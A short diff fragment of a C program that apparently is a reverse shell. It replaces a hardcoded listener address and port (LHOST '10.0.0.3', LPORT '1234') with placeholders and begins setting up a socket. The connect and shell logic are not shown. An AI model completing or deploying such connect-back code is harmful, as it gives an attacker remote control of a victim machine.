@@ -9,8 +9,8 @@
 
 int main(int argc, char* argv[]) {
 
-    argv[1]="10.0.0.3";   //ADD LHOST
-    argv[2]="1234";        //ADD LPORT
+    argv[1]="XX.XX.XX.XX";   //ADD LHOST
+    argv[2]="YYYY";        //ADD LPORT
 
     struct sockaddr_in sa;
     int s;
